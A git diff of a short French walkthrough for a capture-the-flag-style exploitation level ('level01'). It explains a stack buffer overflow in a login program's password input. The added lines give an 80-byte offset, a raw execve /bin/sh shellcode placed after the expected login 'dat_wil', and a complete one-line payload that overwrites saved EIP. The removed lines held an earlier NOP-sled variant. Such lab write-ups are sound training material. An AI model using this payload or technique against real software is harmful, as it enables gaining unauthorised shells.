@@ -2,9 +2,8 @@ On a un programme qui demande un login et un password
 Le login doit être égal à "dat_wil" pour que le programme continue.
 Le password n'a pas d'importance, que ça match "admin" ou non on exit
 Le premier fgets (celui pour le login) met notre input dans une variable globale, on ne peut rien faire ici, cependant le second (celui pour le password) le met sur la stack du main, jusqu'à 100 bytes.
-Le buffer accueillant l'input ne fait que 76 bytes, on peut donc overflow ici jusqu'à la sauvegarde d'eip du main
-On peut donc exporter un shellcode dans l'env (avec 200 NOP devant pour tomber dessus plus facilement)
-puis écraser la sauvegarde d'eip par une adresse au milieu des NOP. En l'ocurrence je mets pile poil au milieu,
-addr_shellcode+100.
-Ce qui nous donne comme entrée, sachant qu'on doit donner "dat_wil" au premier input pour que le programme ne s'arrête pas:
-cat <(perl -le 'print "dat_wil"'; perl -le 'print "A"x80 . "\x58\xd8\xff\xff"') - | ./level01
+Le buffer accueillant l'input fait que 64 bytes. La sauvegarde d'eip est à 0xffffd71c, esp est à 0xffffd6b0 et le buffer est à esp + 0x1c, soit 0xffffd6cc; En faisant eip-[buffer] on trouve 80.
+Il faut donc ecrire 80 char dans le buffer pour ecraser la sauvegarder d'eip ensuite.
+Il y a plusieurs methodes pour lancer un shell, on peut ecrire un shellcode dans l'env ou dans la variable a_user_name, derrière "dat_wil"; C'est comme cela que j'ai fait. J'écris ensuite l'adresse de a_user_name + 7 (pour passer le "dat_wil").
+Ce qui nous donne comme entrée:
+cat <(python -c 'print "dat_wil"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A"*80 + "\x47\xa0\x04\x08"') - | ./level01
